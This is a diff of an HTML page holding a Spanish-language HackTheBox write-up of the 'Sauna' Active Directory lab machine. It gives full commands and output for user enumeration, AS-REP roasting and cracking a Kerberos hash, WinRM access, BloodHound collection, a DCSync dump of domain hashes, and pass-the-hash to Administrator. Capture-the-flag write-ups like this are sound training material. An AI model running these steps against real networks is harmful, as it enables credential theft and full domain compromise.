@@ -1,301 +1,14 @@
-<!doctype html>
-<!--
-  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
-  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
-  Free for personal and commercial use under the MIT license
-  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--->
-<html lang="en" class="no-js">
-  <head>
-    <meta charset="utf-8">
-
-<!-- begin _includes/seo.html --><title>HTB sauna AD - Bast1ant1c</title>
-<meta name="description" content="Vamos a resolver la máquina sauna AD de HackTheBox. ¡Let’s hack!">
-
-
-
-<meta property="og:type" content="article">
-<meta property="og:locale" content="en_US">
-<meta property="og:site_name" content="Bast1ant1c">
-<meta property="og:title" content="HTB sauna AD">
-<meta property="og:url" content="http://localhost:4000/sauna/">
-
-
-  <meta property="og:description" content="Vamos a resolver la máquina sauna AD de HackTheBox. ¡Let’s hack!">
-
-
-
-  <meta property="og:image" content="http://localhost:4000/assets/images/sauna/01-inicio.png">
-
-
-
-
-
-  <meta property="article:published_time" content="2023-02-01T00:00:00-05:00">
-
-
-
-
-
-  
-
-  
-
-
-<link rel="canonical" href="http://localhost:4000/sauna/">
-
-
-
-
-
-
-
-  <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "Person",
-      "name": "Bast1ant1c",
-      "url": "http://localhost:4000",
-      "sameAs": null
-    }
-  </script>
-
-
-
-
-
-
-
-<!-- end _includes/seo.html -->
-
-
-<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Bast1ant1c Feed">
-
-<!-- https://t.co/dKP3o1e -->
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<script>
-  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
-</script>
-
-<!-- For all browsers -->
-<link rel="stylesheet" href="/assets/css/main.css">
-
-<!--[if IE ]>
-  <style>
-    /* old IE unsupported flexbox fixes */
-    .greedy-nav .site-title {
-      padding-right: 3em;
-    }
-    .greedy-nav button {
-      position: absolute;
-      top: 0;
-      right: 0;
-      height: 100%;
-    }
-  </style>
-<![endif]-->
-
-
-
-    <!-- start custom head snippets -->
-
-<!-- insert favicons. use https://realfavicongenerator.net/ -->
-
-<!-- end custom head snippets -->
-
-  </head>
-
-  <body class="layout--single wide">
-
-    <!--[if lt IE 9]>
-<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
-<![endif]-->
-
-    
-
-<div class="masthead">
-  <div class="masthead__inner-wrap">
-    <div class="masthead__menu">
-      <nav id="site-nav" class="greedy-nav">
-                
-        <ul class="visible-links"><li class="masthead__menu-item">
-              <a href="/" >Home</a>
-            </li><li class="masthead__menu-item">
-              <a href="/year-archive/" >Blog</a>
-            </li><li class="masthead__menu-item">
-              <a href="/categories/" >Categories</a>
-            </li><li class="masthead__menu-item">
-              <a href="/tags/" >Tags</a>
-            </li><li class="masthead__menu-item">
-              <a href="/buscador/" >Buscar</a>
-            </li></ul>
-        
-        <button class="greedy-nav__toggle hidden" type="button">
-          <span class="visually-hidden">Toggle menu</span>
-          <div class="navicon"></div>
-        </button>
-        <ul class="hidden-links hidden"></ul>
-      </nav>
-    </div>
-  </div>
-</div>
-    
-
-    <div class="initial-content">
-      
-
-
-  
-    
-
-
-
-<nav class="breadcrumbs">
-  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
-    
-    
-    
-      
-        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
-          <meta itemprop="position" content="1" />
-        </li>
-        <span class="sep">/</span>
-      
-      
-        <li class="current">HTB sauna AD</li>
-      
-    
-  </ol>
-</nav>
-
-  
-
-
-<div id="main" role="main">
-  
-  <div class="sidebar sticky">
-  
-
-
-<div itemscope itemtype="https://schema.org/Person">
-
-  
-
-  <div class="author__content">
-    
-      <h3 class="author__name" itemprop="name"></h3>
-    
-    
-  </div>
-
-  <div class="author__urls-wrapper">
-    <button class="btn btn--inverse">Follow</button>
-    <ul class="author__urls social-icons">
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      <!--
-  <li>
-    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
-      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
-    </a>
-  </li>
--->
-    </ul>
-  </div>
-</div>
-
-  
-  </div>
-
-
-  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="HTB sauna AD">
-    <meta itemprop="description" content="Vamos a resolver la máquina sauna AD de HackTheBox. ¡Let’s hack!">
-    <meta itemprop="datePublished" content="February 01, 2023">
-    
-
-    <div class="page__inner-wrap">
-      
-        <header>
-          <h1 id="page-title" class="page__title" itemprop="headline">HTB sauna AD
-</h1>
-          
-        </header>
-      
-
-      <section class="page__content" itemprop="text">
-        
-        <p class="page__meta">
-          
-            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-01T00:00:00-05:00">February 01, 2023 </time>&emsp;
-          
-          
-        </p>
-        <p align="center">
+<p align="center">
 <img src="/assets/images/sauna/02-tarjeta.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">sauna</code> AD de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la máquina <code class="highlighter-rouge">sauna</code> AD de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">sauna</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">sauna</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack sauna
 <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -303,7 +16,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.175
 </code></pre></div></div>
@@ -346,7 +59,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 49696/tcp open  unknown
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49696 <span class="nt">-sCV</span> <span class="nt">-Pn</span> 10.10.10.175 <span class="nt">-oN</span> versions
 </code></pre></div></div>
@@ -382,14 +95,14 @@ Service Info: Host: SAUNA<span class="p">;</span> OS: Windows<span class="p">;</
 
 <h2 id="ad-domain-detection">AD DOMAIN DETECTION</h2>
 
-<p>Iniciamos con la detección del <code class="language-plaintext highlighter-rouge">dominio</code> donde inicialmente, por medio de la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> enumeramos información necesaria para tener un mejor alcance a la máquina víctima.</p>
+<p>Iniciamos con la detección del <code class="highlighter-rouge">dominio</code> donde inicialmente, por medio de la utilidad <code class="highlighter-rouge">crackmapexec</code> enumeramos información necesaria para tener un mejor alcance a la máquina víctima.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.175
 </code></pre></div></div>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
 </code></pre></div></div>
 
-<p>Agregamos en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+<p>Agregamos en el archivo <code class="highlighter-rouge">/etc/hosts</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
 nvim /etc/hosts
@@ -456,7 +169,7 @@ result: 0 Success
 <span class="c"># numEntries: 1</span>
 </code></pre></div></div>
 
-<p>En este punto hemos realizado diferentes enumeraciones sin exito, ahora con <code class="language-plaintext highlighter-rouge">ldapsearch</code>, junto con el dominio <code class="language-plaintext highlighter-rouge">EGOTISTICAL-BANK.LOCAL</code>, profundizamos en la enumeración, obteniendo un potencial usuario.</p>
+<p>En este punto hemos realizado diferentes enumeraciones sin exito, ahora con <code class="highlighter-rouge">ldapsearch</code>, junto con el dominio <code class="highlighter-rouge">EGOTISTICAL-BANK.LOCAL</code>, profundizamos en la enumeración, obteniendo un potencial usuario.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.175 <span class="nt">-b</span> <span class="s1">'DC=EGOTISTICAL-BANK,DC=LOCAL'</span> | <span class="nb">grep</span> <span class="s1">'dn: CN='</span>
 </code></pre></div></div>
@@ -511,7 +224,7 @@ Version: dev <span class="o">(</span>n/a<span class="o">)</span> - 01/24/23 - Ro
 
 <h2 id="tgt-getnpusers-enum">TGT GETNPUSERS ENUM</h2>
 
-<p>Obtenemos que <code class="language-plaintext highlighter-rouge">hsmith</code> es un usuario valido! Ahora vamos a realizar la misma validación con la herramienta <code class="language-plaintext highlighter-rouge">GetNPUsers</code>.</p>
+<p>Obtenemos que <code class="highlighter-rouge">hsmith</code> es un usuario valido! Ahora vamos a realizar la misma validación con la herramienta <code class="highlighter-rouge">GetNPUsers</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
 </code></pre></div></div>
@@ -526,7 +239,7 @@ Version: dev <span class="o">(</span>n/a<span class="o">)</span> - 01/24/23 - Ro
 
 <h2 id="users-dictionary-web-enum">USERS DICTIONARY (WEB ENUM)</h2>
 
-<p>Ahora que tenemos usuarios, procedemos a realizar la enumeración de información a nivel web, encontrando en la sección <code class="language-plaintext highlighter-rouge">about</code> potenciales usuarios.</p>
+<p>Ahora que tenemos usuarios, procedemos a realizar la enumeración de información a nivel web, encontrando en la sección <code class="highlighter-rouge">about</code> potenciales usuarios.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.175/about.html"</span> | <span class="nb">grep</span> <span class="s1">'&lt;p class="mt-2"&gt;'</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'&gt;'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'&lt;'</span>
 </code></pre></div></div>
@@ -544,7 +257,7 @@ sdriver
 
 <h2 id="tgt-kerbrute-enum-new-userstxt">TGT KERBRUTE ENUM (NEW USERS.TXT)</h2>
 
-<p>Con el nuevo archivo <code class="language-plaintext highlighter-rouge">users.txt</code> realizamos la misma validación de usuarios con <code class="language-plaintext highlighter-rouge">kerbrute</code>.</p>
+<p>Con el nuevo archivo <code class="highlighter-rouge">users.txt</code> realizamos la misma validación de usuarios con <code class="highlighter-rouge">kerbrute</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="nt">-d</span> EGOTISTICAL-BANK.LOCAL <span class="nt">--dc</span> 10.10.10.175 users.txt
 </code></pre></div></div>
@@ -569,7 +282,7 @@ Version: dev <span class="o">(</span>n/a<span class="o">)</span> - 01/24/23 - Ro
 
 <h2 id="tgt-getnpusers-enum-new-userstxt">TGT GETNPUSERS ENUM (NEW USERS.TXT)</h2>
 
-<p>Procedemos con el mismo ejercicio con la herramienta <code class="language-plaintext highlighter-rouge">GetNPUsers</code> y como podemos ver ya encontramos el hash krb5 que podemos crackear para obtener la contraseña de un usuario del AD.</p>
+<p>Procedemos con el mismo ejercicio con la herramienta <code class="highlighter-rouge">GetNPUsers</code> y como podemos ver ya encontramos el hash krb5 que podemos crackear para obtener la contraseña de un usuario del AD.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
 </code></pre></div></div>
@@ -586,7 +299,7 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c753449e67f9983145b8ca9f57efabfc$fb9
 
 <h2 id="cracking-kerberos-hash">CRACKING KERBEROS HASH</h2>
 
-<p>Ahora que tenemos el hash capturado, vamos a almacenarlo en el archivo <code class="language-plaintext highlighter-rouge">hash</code> y crackearlo con <code class="language-plaintext highlighter-rouge">hashcat</code></p>
+<p>Ahora que tenemos el hash capturado, vamos a almacenarlo en el archivo <code class="highlighter-rouge">hash</code> y crackearlo con <code class="highlighter-rouge">hashcat</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c753449e67f9983145b8ca9f57efabfc$fb9f945439826b8aea11a83711e9aa2f5eae6c0815aa0b937961cf227378c0bc9dfdd081485797f2942432e581eb1687a87c2631ab398848225e7d25b58116285e9939019f76b7492c6e03445a5901848ccdc40607d257062cec34e5b09e0aaefcea476b6ab929bf55692097b6daa598e2dd1b7fb7c05ce18a115ce3e7a7c9ec316ec280656d5b6ddf1ce4a0fab4e5d5a93d8bb95158ddead5524c800a50f224d433c8a1668d42616d72c428d7154f2204f0a61397b8e139d9359631f7339468f581056ff0a891c769a6d125a4af64f5af40093b00e82863785aaf98237116a9028a6f3bb8cb49944e464bc7da7516f0a0b7880b7021d4e25f7cd98733a5d3af'</span> <span class="o">&gt;</span> <span class="nb">hash</span>
 </code></pre></div></div>
@@ -598,7 +311,7 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c753449e67f9983145b8ca9f57efabfc$fb9
 
 <h2 id="granted-access-fsmith-user">GRANTED ACCESS FSMITH USER</h2>
 
-<p>Ahora tenemos lo necesario para conectarnos remotamente en caso de tener credenciales validas previamente detectadas por <code class="language-plaintext highlighter-rouge">crackmapexec</code> por medio de la utilidad <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p>
+<p>Ahora tenemos lo necesario para conectarnos remotamente en caso de tener credenciales validas previamente detectadas por <code class="highlighter-rouge">crackmapexec</code> por medio de la utilidad <code class="highlighter-rouge">evil-winrm</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span>
 </code></pre></div></div>
@@ -614,9 +327,9 @@ WINRM       10.10.10.175    5985   SAUNA            <span class="o">[</span>+] E
 </code></pre></div></div>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span>
 </code></pre></div></div>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami
 </code></pre></div></div>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>egotisticalbank\fsmith
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>egotisticalbank\fsmith
 </code></pre></div></div>
 
 <h2 id="ad-enum-local">AD ENUM LOCAL</h2>
@@ -666,7 +379,7 @@ The <span class="nb">command </span>completed successfully.
 
 <h2 id="ad-winpeas-enum">AD WINPEAS ENUM</h2>
 
-<p>Vamos a realizar una enumeración profunda en la máquina y para esto hacemos uso de la herramienta <code class="language-plaintext highlighter-rouge">WINPEAS</code> descargandola en nuestra máquina y transmitiendola a la máquina víctima, permitiendo destacar información adicional que ayuda a la enumeración local, encontrando en este caso una contraseña para el usuario <code class="language-plaintext highlighter-rouge">svc_loanmgr</code></p>
+<p>Vamos a realizar una enumeración profunda en la máquina y para esto hacemos uso de la herramienta <code class="highlighter-rouge">WINPEAS</code> descargandola en nuestra máquina y transmitiendola a la máquina víctima, permitiendo destacar información adicional que ayuda a la enumeración local, encontrando en este caso una contraseña para el usuario <code class="highlighter-rouge">svc_loanmgr</code></p>
 
 <h4 id="máquina-atacante">MÁQUINA ATACANTE</h4>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/carlospolop/PEASS-ng/releases/download/20220717/winPEASx64.exe
@@ -692,7 +405,7 @@ The <span class="nb">command </span>completed successfully.
 
 <h2 id="granted-access-svc_deploy-user">GRANTED ACCESS SVC_DEPLOY USER</h2>
 
-<p>Ahora tenemos lo necesario para conectarnos remotamente en caso de tener credenciales validas previamente detectadas por <code class="language-plaintext highlighter-rouge">crackmapexec</code> por medio de la utilidad <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p>
+<p>Ahora tenemos lo necesario para conectarnos remotamente en caso de tener credenciales validas previamente detectadas por <code class="highlighter-rouge">crackmapexec</code> por medio de la utilidad <code class="highlighter-rouge">evil-winrm</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.175 <span class="nt">-u</span> <span class="s1">'svc_loanmgr'</span> <span class="nt">-p</span> <span class="s1">'Moneymakestheworldgoround!'</span>
 </code></pre></div></div>
@@ -716,10 +429,10 @@ WINRM       10.10.10.175    5985   SAUNA            <span class="o">[</span>+] E
 
 <h2 id="bloodhound-install">BLOODHOUND INSTALL</h2>
 
-<p>Para realizar una enumerción más detallada de permisos, usuarios y grupos del AD, vamos a hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">bloodhound</code>, por lo tanto vamos a proceder a instalarla.
+<p>Para realizar una enumerción más detallada de permisos, usuarios y grupos del AD, vamos a hacer uso de la herramienta <code class="highlighter-rouge">bloodhound</code>, por lo tanto vamos a proceder a instalarla.
 Es importante aclarar que si existen novedades con la instalación se recurra al proyecto directamente, esto debido a que se está en constante actualización.</p>
 
-<p>Al momento de ejecutar <code class="language-plaintext highlighter-rouge">neo4j</code> este requiere acceder a un puerto especifico y acceder con claves por defecto, luego de este proceso pedira un cambio de clave, es importante guardar estas credenciales porque las utilizaremos al momento de acceder a <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>
+<p>Al momento de ejecutar <code class="highlighter-rouge">neo4j</code> este requiere acceder a un puerto especifico y acceder con claves por defecto, luego de este proceso pedira un cambio de clave, es importante guardar estas credenciales porque las utilizaremos al momento de acceder a <code class="highlighter-rouge">bloodhound</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>neo4j bloodhound
 </code></pre></div></div>
@@ -730,7 +443,7 @@ Es importante aclarar que si existen novedades con la instalación se recurra al
 
 <h2 id="bloodhound-enum">BLOODHOUND ENUM</h2>
 
-<p>Ahora vamos a descargar y transmitir el binario <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> a la máquina víctima para extraer la información del AD y posteriormente visualizarla en <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>
+<p>Ahora vamos a descargar y transmitir el binario <code class="highlighter-rouge">SharpHound.ps1</code> a la máquina víctima para extraer la información del AD y posteriormente visualizarla en <code class="highlighter-rouge">bloodhound</code>.</p>
 
 <h4 id="máquina-atacante-1">MÁQUINA ATACANTE</h4>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
@@ -754,7 +467,7 @@ Es importante aclarar que si existen novedades con la instalación se recurra al
 
 <h3 id="bloodhound-interaction">BLOODHOUND INTERACTION</h3>
 
-<p>Ya tenemos la información descargada en nuestro equipo, ahora procedemos a revisar la data con <code class="language-plaintext highlighter-rouge">bloodhound</code></p>
+<p>Ya tenemos la información descargada en nuestro equipo, ahora procedemos a revisar la data con <code class="highlighter-rouge">bloodhound</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neo4j console &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
 </code></pre></div></div>
@@ -791,7 +504,7 @@ Es importante aclarar que si existen novedades con la instalación se recurra al
 
 <h2 id="dcsync-attack">DCSYNC ATTACK</h2>
 
-<p>Vamos a realizar un <code class="language-plaintext highlighter-rouge">DCSYNK ATTACK</code>, suplantando el AD para capturar los hashes que nos permiten la conexión de los usuarios que logremos dumpear.</p>
+<p>Vamos a realizar un <code class="highlighter-rouge">DCSYNK ATTACK</code>, suplantando el AD para capturar los hashes que nos permiten la conexión de los usuarios que logremos dumpear.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump <span class="s1">'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'</span>
 </code></pre></div></div>
@@ -830,7 +543,7 @@ SAUNA<span class="nv">$:</span>des-cbc-md5:5e839d57a1c876e6
 
 <h2 id="granting-access-administrator-user-pass-the-hash">GRANTING ACCESS ADMINISTRATOR USER (PASS THE HASH)</h2>
 
-<p>Tenemos el hash del usuario <code class="language-plaintext highlighter-rouge">Administrator</code>, ahora vamos a conectarnos con la utilidad <code class="language-plaintext highlighter-rouge">psexec</code>, para entablar una conexión directamente con la máquina víctima.</p>
+<p>Tenemos el hash del usuario <code class="highlighter-rouge">Administrator</code>, ahora vamos a conectarnos con la utilidad <code class="highlighter-rouge">psexec</code>, para entablar una conexión directamente con la máquina víctima.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-psexec <span class="s1">'EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175'</span> cmd.exe <span class="nt">-hashes</span> <span class="s1">':823452073d75b9d1cf70ebdf86c7f98e'</span>
 </code></pre></div></div>
@@ -842,7 +555,7 @@ SAUNA<span class="nv">$:</span>des-cbc-md5:5e839d57a1c876e6
 
 <h2 id="flags">FLAGS</h2>
 
-<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
+<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd c:<span class="se">\ </span>       
 c:<span class="se">\&gt;</span><span class="nb">dir</span> /b/s user.txt
@@ -859,7 +572,7 @@ c:<span class="se">\&gt;</span>echo.%root:~0,10%
 7aba2d34ff
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">sauna</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">sauna</code> de HackTheBox!</p>
 
 <p align="center">
 <img src="/assets/images/sauna/04-finish.png" />
@@ -868,122 +581,3 @@ c:<span class="se">\&gt;</span>echo.%root:~0,10%
 <p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>
 
 <p><strong>Nos vemos en otro bit.</strong></p>
-
-        
-      </section>
-
-      <footer class="page__meta">
-        
-        
-  
-
-
-  
-  
-  
-
-  <p class="page__taxonomy">
-    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
-    <span itemprop="keywords">
-    
-      
-      
-      <a href="/tags/#active-directory" class="page__taxonomy-item" rel="tag">Active Directory</a><span class="sep">, </span>
-    
-      
-      
-      <a href="/tags/#sauna" class="page__taxonomy-item" rel="tag">Sauna</a><span class="sep">, </span>
-    
-      
-      
-      <a href="/tags/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
-    
-    </span>
-  </p>
-
-
-
-
-  
-
-
-  
-  
-  
-
-  <p class="page__taxonomy">
-    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
-    <span itemprop="keywords">
-    
-      
-      
-      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
-    
-    </span>
-  </p>
-
-
-        
-          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-01T00:00:00-05:00">February 01, 2023</time></p>
-        
-      </footer>
-
-      
-
-      
-  <nav class="pagination">
-    
-      <a href="/timelapse/" class="pagination--pager" title="HTB timelapse AD
-">Previous</a>
-    
-    
-      <a href="#" class="pagination--pager disabled">Next</a>
-    
-  </nav>
-
-    </div>
-
-    
-  </article>
-
-  
-</div>
-
-    </div>
-
-    
-
-    <div class="page__footer">
-      <footer>
-        <!-- start custom footer snippets -->
-
-<!-- end custom footer snippets -->
-        <div class="page__footer-follow">
-  <ul class="social-icons">
-    
-
-    
-<!--
-    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
--->
-  </ul>
-</div>
-
-<div class="page__footer-copyright">&copy; 2023 Bast1ant1c</div>
-
-      </footer>
-    </div>
-
-    
-  <script src="/assets/js/main.min.js"></script>
-  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
-
-
-
-
-
-
-
-
-  </body>
-</html>
